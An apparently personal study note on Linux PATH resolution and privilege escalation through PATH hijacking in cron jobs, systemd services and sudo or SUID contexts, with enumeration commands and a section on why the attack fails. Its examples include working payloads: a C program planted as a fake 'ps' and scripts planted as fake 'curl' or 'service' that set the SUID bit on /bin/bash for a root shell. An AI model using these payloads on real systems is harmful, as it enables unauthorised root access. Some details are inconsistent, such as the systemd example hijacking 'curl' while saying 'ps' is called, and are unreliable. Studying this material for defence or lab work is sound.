---
created: 26-01-2026
tags:
  - Linux_PrivEsc
  - Linux
---
## The `PATH` environment variable

>The **[`PATH`](https://www.linfo.org/path_env_var.html) environment variable** specifies a colon-separated list of directories the shell searches sequentially to find executable files when you run a command by name without specifying its absolute or relative path.

>[!example]+
>```bash
>echo $PATH
>```
>```bash
>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
>```

When you type `ls` and press Enter, Bash:
1. Reads and parses your input into a command.
2. Checks if the command matches an **alias** (e.g., `alias ls='ls --color=auto'`).
3. Checks if a **shell function** with the same name as the command (`ls`) is defined in the current environment (`ls() { ... }`). 
4. Checks if the command is a **built-in** (like `cd`, `echo`, `printf`, etc.).
5. If the command **doesn't contain slashes in its name**, the shell iterates through the colon-separated list of directories specified in the **`PATH` environment variable** searching for an executable with the same name as the command (`ls`).
	- The shell executes the **first matching executable** it finds and stops.
	- If no match is found, returns `command not found` error.

>[!note]+ If you type a path that *contains a slash* `/` (e.g., `./ls`, `/bin/ls`), Bash treats it as an explicit file path.and **doesn't search `PATH` at all**.

>[!important] Creating a script or program in a directory listed in the `PATH` makes it executable from any directory on the system.



### Where `PATH` comes from

>[!note] For more information on how environment variables behave, see [[environment_variables#Where environment variables come from]].
#### Variable inheritance

>[!note] At the kernel level, `PATH` is simply a null-terminated string stored in the process's memory stack (specifically, the `environ` array).

- Environment variables, including `PATH`, are inherited from parent to child processes:
	- When a process calls `fork()` to spawn a child, the child process receives an exact **copy** of the parent's memory space, including all environment variables.
	- The child can then replace itself with a new program by calling `execve()`. By default, the new program inherits the same environment from the parent via the `envp` argument.

>[!important] Only **exported** variables are passed from parent to child processes (`export ...`). Local variables are dropped.

>[!note] Child changes to `env` don't affect parent (independent copies).

>[!important] A program can explicitly choose to ignore the inherited environment and start fresh (e.g., using `env -i` or `execle` with a `NULL` environment). This is exactly what `sudo` and some hardened SUID binaries do.

This means that normally, processes you start use `PATH` exported from your current environment. But there are special cases. 
Below is the description of how `PATH` is set stating from system boot, and when it's reset.
#### Init and system boot

- During boot, the kernel starts the init system (usually systemd or legacy SysV Init) — PID `1` — with a minimal hardcoded environment. The kernel itself doesn't set variables like `PATH` — the init process does.
- Verify global systemd `PATH`:

```bash
systemctl show-environment | grep PATH
```
```bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
```

>[!important]+ `PATH` for system services and user services (`--user`) will be different.
>- When the system boots, systemd establishes a global environment for system services, including `PATH`:
> 
> ```bash
> systemctl show-environment | grep PATH
> PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
> ```
> - When you log in, a separate instance of systemd (`systemd --user`) is started for your session. It may merge additional paths (like Perl or Ruby binary paths) into `PATH`:
> ```bash
> systemctl --user show-environment | grep PATH
>PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl
> ```

>[!warning] The initial `PATH` is critical for system stability. If a service relies on a binary not in this path, it will fail.

>[!note] SysV Init sources `/etc/environment` (Debian/Ubuntu) or sets `PATH` in init scripts. The default is typically compiled into the init binary.
#### The login process

- When you authenticate via a TTY, SSH, or serial console, the [`login`](https://man.archlinux.org/man/login.1.en) program is invoked. 
- `login` sets UID and GID, as well as environment variables like `HOME`, `USER`, `SHELL`, `PATH`, `LOGNAME`, `MAIL`, according to `/etc/login.defs` and the corresponding entry in `/etc/passwd`.
- The default `PATH` value is set to `ENV_PATH` (for regular users) and `ENV_SUPATH` (for root) in `/etc/login.defs` (varies by distribution).

```bash
cat /etc/login.defs | grep PATH
```

```bash
# ...
*REQUIRED*  The default PATH settings, for superuser and normal users.
#
# (they are minimal, add the rest in the shell startup files)
ENV_SUPATH  PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
ENV_PATH    PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
# ...
```

These values are inherited by the shell you start (e.g., `bash`) and form the basis of your `PATH`.

>[!important] `login` sets a **default `PATH`** _before_ any shell startup file runs.

>[!note]+ The role of PAM
>[PAM (Pluggable Authentication Modules)](https://wiki.archlinux.org/title/PAM) can modify environment variables during login. For instance, a module might add a custom directory to your `PATH` based on your user group or authentication method. 
#### Shell invocation

Once you're logged in, your shell (e.g., `bash`) sources configuration files (depending on the shell type) that may modify the default `PATH` passed from `login`.

Here are files that the Bash shell sources based on its type:

- Interactive login shells — triggered by SSH sessions, console logins, `su - username`, `bash --login` or `bash -l`, and display/login managers (`sddm`, `gdm`):
	1. `/etc/profile` (sources `/etc/profile.d/*.sh` and `/etc/bash.bashrc`).
	2. `~/.bash_profile` (per-user profile; often sources `~/.bashrc`).
	3. `~/.bash_login`
	4. `~/.profile`

- Interactive non-login shells — triggered by opening terminal emulator in GUI, running `bash` from existing shell, subshells in interactive scripts:
	1. `/etc/bash.bashrc`
	2. `~/.bashrc` (skipped if `--norc` is set).

>[!note] Non-login shells typically inherit `PATH` from their parent rather than rebuilding it from scratch.

- Non-interactive shells — triggered by script invocation in shells (`bash script.sh`), scripts with shebang `#!/bin/bash`, SSH remove commands (`ssh user@host 'command'`):
	- Looks for the variable `BASH_ENV` in the environment and expands its value if it's set; then uses the expanded value as the name of a file to read and execute.

>[!important] Non-interactive shells do not source profile files automatically; they inherit the environment from parent process.

>[!note] See [[shells]].

>[!warning] Non-interactive shells (Cron, systemd) **do not read** `.bashrc` and `.profile`; instead, they rely on **hardcoded defaults** and **explicit `PATH=` assignments**.

#### Cron jobs

- Cron jobs inherit minimal environment; any custom variables, including `PATH`, are set in crontab explicitly.

>[!example]+
> ```bash
> cat /etc/crontab
> ```
> ```bash
> # ... 
> 
> SHELL=/bin/sh
> PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
> 
> # m h dom mon dow user  command
> 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
> 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
> 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
> 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
> ```

##### Systemd services

- Beyond systemd defaults, services define their own `PATH` via `Environment=` or `EnvironmentFile=` in their unit files.

- Check a service environment:

```bash
systemctl show <service-name> --property=Environment
```

>[!example]+
> ```bash
> systemctl show ollama.service --property=Environment
> ```
> 
> ```bash
> Environment="PATH=\$PATH"
> ```

#### `sudo` and `secure_path`

- By default, `sudo` resets the environment and sets `PATH` to  `secure_path` in `/etc/sudoers` (if it's configured):

```bash
# /etc/sudoers
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

>[!note]+ `/etc/sudoers` is readable only by root by default. 

- Check `secure_path`:

```bash
sudo grep secure_path /etc/sudoers
```

>[!example]+
> ```bash
> sudo grep secure_path /etc/sudoers
> ```
>
> ```bash
> Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/bin"
> ```

>[!important] `secure_path` **does not** affect root processes run without `sudo`, such as SUID binaries, Cron jobs, and systemd services.

>[!note]+ `PATH` in SUID and SGID binaries
>- By default, SUID and SGID binaries **inherit user's `PATH`**.
>- As for dynamically-linked binaries, when `ld.so` detects SUID/SGID, it enters a secure execution mode where it sanitizes variables critical for library loading, such as `LD_LIBRARY_PATH` and `LD_PRELOAD`, but this doesn't include `PATH` by default. Though some modern implementations may sanitize it, too. 

>[!note]+ See [[sudo_privilege_escalation]] and [[SUID_&_SGID_privilege_escalation]].

## Privilege escalation with `PATH` hijacking

If a privileged process (e.g., a SUID binary owned by `root` or a command run with `sudo`) calls a command **without specifying its full path** (e.g., `ps` instead of `/bin/ps`), and if:
- The attacker can **write to one of the directories listed in the process's `PATH`**, and
- That writable directory appears in `PATH` **before** the directory with the legitimate binary,
Then the attacker can place a **malicious executable** with the same name as the called command inside the writable directory to **execute arbitrary code with privileged of the target process**. This is called **`PATH` hijacking**.

>[!important] `PATH` hijacking happens when a privileged process runs a command without a full path, and you control what binary gets executed first.

The exploitation requires three things:

- **Privileged execution**
	- A binary or script runs as root.
	- It can be something you can run with `sudo`, a SUID binary, Cron job, systemd service, etc.

- **Unqualified command**
	- The binary/script uses a command without specifying its full path, e.g., `tar` instead of `/bin/tar`.

- **`PATH` influence**
	- You can either write to a directory in `PATH` the target executable uses, or modify `PATH` itself. 

If any of these things are missing — `PATH` hijacking is not possible, move on to the next technique.

>[!note]+ `PATH` resolution in different C/C++ functions
> In C/C++, not all functions that execute commands respect the `PATH` environment variable. Those that respect include:
> - `system()`: invokes `/bin/sh -c "command"`, so the shell handles `PATH` lookup.
> - `execlp()`, `execvp()`: `PATH`-search variants of `exec()`; use current environment's `PATH`.
> - `execvpe()`, `execle()`: similar to `execlp()` and `execvp()`, POSIX. 
> 
> Functions that ignore `PATH` and always require full path to a command:
> - `execl()`, `execv()`: expect full path; fail if file is not found at the specified location.
> - `execve()`: low-level system call; no `PATH` lookup.
> - `execle()`: similar to `execve()`, no `PATH` lookup.
> 
> See [this](https://pubs.opengroup.org/onlinepubs/9699919799/functions/exec.html) page.

## Enumeration

You don't look for `PATH` hijacking directly. You look for **execution contexts**, then test for `PATH` abuse. It doesn't just show yourself; you must **reason it out**. 

- Check if you can run something with `sudo`:

```bash
sudo -l
```

Pay special attention to `NOPASSWD`, custom scripts, relative paths, and wildcards in the output.

>[!note] See [[sudo_privilege_escalation]].

- Find SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Look for custom binaries, scripts wrapped in binaries, and anything outside `/bin/usr/bin`.

>[!note] [[SUID_&_SGID_privilege_escalation]].

- Cron jobs:

```bash
crontab -l
```

```bash
ls -l /etc/cron*
```

```bash
cat /etc/crontab
```

>[!note] Cron is probably the most common scenarios of privilege escalation via `PATH` hijacking.

>[!note] See [[Cron_jobs_privilege_escalation]],

- Systemd services:

```bash
systemctl list-unit-files
```

- To see the exact environment for a running process, inspect `/proc/<PID>/environ` or run:

```bash 
tr '\0' '\n' < /proc/<PID>/environ 
```
```bash
ls -l /etc/systemd/system
```

Check for custom services and `ExecStart` commands.

>[!note] See [[systemd_timers_and_services]].

- Any scripts owned and run by root in directories like:
	- `/opt`
	- `/usr/local/bin`
	- `/usr/local/sbin`
	- `/srv`

- To see the exact environment for a running process, inspect `/proc/<PID>/environ` or run:

```bash 
tr '\0' '\n' < /proc/<PID>/environ 
```

> [!tip]+
> - If you can't read the script or it's a binary but can execute, you can use [`strace`](https://man.archlinux.org/man/strace.1.en) to trace system calls:
> 
> ```bash
> strace -e execve /path/to/suid_binary 2>&1 | grep execve
> ```
> 
> Look for commands invoked without their full path:
> 
> ```bash
> execve("ps", ...)
> ```

Once you find something privileged, ask yourself:

>[!tip] Does it call external commands without full paths?

If yes:
- Are there any directories in `PATH` you can write to?
- Is `.` included in `PATH`?
- Is `PATH` inherited from user (your regular `PATH`)?
- Can `PATH` be modified?

Try to understand where the `PATH` the executable uses comes from (refer to [[#Where `PATH` comes from]]):
- For `sudo`, `PATH` is specified in `security_path` in `/etc/sudoers`, and is likely something minimal (`sudoers` is not world-readable by default).
- For SUID binaries, the `PATH` is likely taken from your environment, **which you control**.
- For Cron jobs, `PATH` is defined in crontabs.
- For systemd services, `PATH` can be set using the `Environment=` or `EnvironmentFile=` directives in the `[Service]` section of the unit file; if not, systemd's default value will be used.
## Examples
### `PATH` hijacking in a Cron job

>[!example]+
> Suppose you find a privileged Cron job in `/etc/cron.d/log-cleaner`:
> 
> ```bash
> cat /etc/cron.d/log-cleaner
> ```
> 
> ```bash
> # /etc/cron.d/log-cleaner
> # runs every Friday to clear old logs
> 0 0 * * 5 root PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /usr/local/bin/clean-logs.sh
> ```
> 
> The crontab specifies a **custom `PATH` variable**, which includes a **world-writable `/tmp` directory**.
> 
> You check the script itself, `/usr/local/bin/clean-logs.sh`:
> 
> ```bash
> cat /usr/local/bin/clean-logs.sh
> ```
> 
> ```bash
> #!/bin/bash
> # this script finds and removes old log files.
> 
> # find files older than 7 days in /var/log and remove them
> find /var/log -type f -mtime +7 -exec rm {} \;
> 
> # check if the cleanup was successful by checking the process list
> ps aux | grep "rm" | grep -v grep
> ```
> 
> The script uses the `ps` command **without using its absolute path** (`/usr/bin/ps`). When the cron job runs, the shell will search for `ps` in the directories listed in `PATH`, in order. It will check `/tmp` _before_ it checks `/usr/bin`. This is an opportunity.
> 
> Your goal is to create a file named `ps` inside `/tmp`. When the Cron job runs, it will execute the file with **root privileges**.
> 
> You create a simple C program:
> 
> ```C
> // /tmp/payload.c
> #include <stdlib.h>
> #include <unistd.h>
> 
> int main() {
>     setuid(0);
>     setgid(0);
>     // grant persistent access by setting the SUID bit on bash
>     system("chmod 4777 /bin/bash");
>     return 0;
> }
> ```
> 
> Then compile it with the name `ps` and place it to a writable `/tmp` directory:
> 
> ```bash
> gcc /tmp/payload.c -o /tmp/ps && chmod +x /tmp/ps
> ```
> 
> Now, you should just wait till Friday. When the Cron job executes, it runs `/tmp/ps` instead of the real `/usr/bin/ps`. It sets a SUID bit on the `/bin/bash` binary and gives everyone a permission to read, write, and execute it. 
> 
> ```bash
> ls -la /bin/bash
> ```
> 
> ```bash
> -rwsr-xr-x 1 root root 1162328 Aug  1 21:56 /bin/bash
> ```
> 
> So, next time you connect, you can just run `bash` to get a root shell:
> 
> ```bash
> /bin/bash -p
> ```

>[!important] Cron **does not inherit user `PATH`**. It is either defined in the Cron file or defaults to something minimal like `/usr/bin:/bin`.
>```bash
>grep PATH /etc/crontab /etc/cron.d/*
>```
### `PATH` hijacking in a systemd service

>[!note] A systemd service can specify custom environment variables in the service file.

>[!example]+
> During enumeration, you find a custom service file:
> 
> ```bash
> cat /etc/systemd/system/telemetry.service
> ```
> 
> ```INI
> [Unit]
> Description=Custom telemetry service
> After=network.target
> StartLimitIntervalSec=0
> 
> [Service]
> Type=simple
> Restart=always
> RestartSec=1
> User=root
> Environment="PATH=/tmp/custom-bin:/usr/sbin:/usr/bin:/sbin:/bin"
> ExecStart=/usr/local/bin/telemetry.sh
> 
> [Install]
> WantedBy=multi-user.target
> ```
> 
> - The service is executed as root.
> - The script `/usr/local/bin/telemetry.sh` calls the `ps` command without specifying its full path. 
> - The `/tmp/custom-bin` directory, the one listed in the `PATH` used by the systemd service, happens to be writable by your current user.
> 
> Exploitation is simple: you create a script named `curl` in the `/tmp/custom-bin` with the payload:
> 
> ```bash
> echo '#!/bin/bash' > /tmp/custom-bin/curl
> echo 'chmod 4777 /bin/bash' >> /tmp/custom-bin/curl
> chmod +x /tmp/custom-bin/curl
> ```
> 
> The next time the service is started, it will execute your script. Executing `/bin/bash` will give you a root shell.

>[!tip]+
> Environment variables may also be loaded from disk, via `EnvironmentFile=`:
> 
> ```bash
> EnvironmentFile=/etc/sysconfig/telemetry
> ```
### `PATH` hijacking with `.`

On Linux, `.` points to the current working directory.

If `.` is present in the `PATH` or in the beginning of any directories listed in the `PATH`, **the shell looks for commands in the current working directory or relative to it**.

If present, it is **always a vulnerability**.

- Check for `.` in `PATH`:

```bash
echo $PATH | tr ':' '\n' | grep '\.'
```

>[!example]+
> Imagine you've gained a shell as the `www-data` user. You find a privileged Cron job:
> 
> ```bash
> * */5 * * * root PATH=.: /usr/local/bin/deploy.sh
> ```
> 
> The `PATH` is set to just `.` followed by the system default. This is extremely dangerous.
> 
> The `/usr/local/bin/deploy.sh` script looks like this:
> 
> ```bash
> #!/bin/bash
> 
> cd /var/www/html
> git pull origin main
> service apache2 restart
> ```
> 
> The script changes its current working directory to `/var/www/html`, and then runs the `git` and `service` commands without specifying their full paths.
> 
> As `www-data` user, you have write access to `/var/www/html`.
> 
> ```bash
> ls -la /var/www/html
> ```
> 
> All you need to do to escalate privileges is to create an executable named `git` or `service` with the code you want to run, and place it in `/var/www/html`. 
> 
> During the execution, the script will go to the `/var/www/html` directory, and the current directory, therefore the `.` path, will refer to it. This means it is now included in the `PATH`, and binaries for all subsequent commands called just by their names will first be searched there.
> 
> ```bash
> echo '#!/bin/bash' > /var/www/html/service
> echo 'chmod 4777 /bin/bash' >> /var/www/html/service
> chmod +x /var/www/html/service
> ```

## Why `PATH` hijacking fails

Below are common reasons why `PATH` hijacking attack *does not work*:

1. `secure_path` is in effect
	- Commands run with `sudo` prefer `PATH` specified in the `secure_path` default in `/etc/sudoers`, if it's set.
	- `secure_path`, however, **does not** affect processes that are already running as root independently of `sudo` (e.g., privileged Cron jobs, systemd services, etc.).

2. The script uses absolute path
	- The `PATH` variable is only consulted if a command is specified without the full path. Otherwise, `PATH` is ignored, and therefore `PATH` hijacking does't work.

3. The command is shell built-in
	- Commands like `echo`, `cd`, `pwd`, `export` are built into the shell itself. They are not separate executables on the disk and therefore **can't be hijacked via `PATH`**.

4. The target process's `PATH` is not what you think
	- The `PATH` you see in your interactive shell (`echo $PATH`) is **irrelevant** if the target process is a non-interactive cron job or a systemd service. These processes often have a very minimal, custom `PATH`.
	- You should find the target's actual `PATH`. For example, for Cron jobs, it's typically defined in `/etc/crontab` or can be set within the specific cron file in `/etc/cron.d`. 

5. Binary is statically linked (rare but appears in hardened environments)
	- No libc `PATH` resolution.

6. `PATH` is set internally

```bash
setenv("PATH","/usr/bin:/bin",1);
```

7. No writable directory in `PATH`
## References and further reading

- [`Linux Privilege Escalation Using PATH Variable — Hacking Articles`](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
- [`Environment variables — Arch Wiki`](https://wiki.archlinux.org/title/Environment_variables)
- [`login — man pages`](https://man.archlinux.org/man/login.1.en)
- [`PAM — Arch Wiki`](https://wiki.archlinux.org/title/PAM)




## Full path

- Show the full path of a command:

```bash
echo "$(command -v ls)"
```

```bash
type ls
```

```bash
type -a
```

>[!note] Prefer `type` and `command -v` over `which` and `whereis`.

```bash
which ls
```

>[!warning]+ `which` can lie if `PATH` differs between environments.

```bash
whereis ls
```

>[!example]+ 
> - `command -v`:
> 
> ```bash
> echo "$(command -v ls)"
> ```
> ```bash
> alias ls='ls --color=tty'
> ```
> 
> - `type`:
> 
> ```bash
> type ls
> ```
> ```bash
> ls is an alias for ls --color=tty
> ```
> 
> - `type -a`:
> 
> ```bash
> type -a ls
> ```
> ```bash
> ls is an alias for ls --color=tty  
> ls is /usr/bin/ls
> ```
> 
> - `which`:
> 
> ```bash
> which ls
> ```
> ```bash
> ls: aliased to ls --color=tty
> ```
> 
> - `whereis`:
> 
> ```bash
> whereis ls
> ```
> ```bash
> ls: /usr/bin/ls /usr/share/man/man1/ls.1.gz
> ```
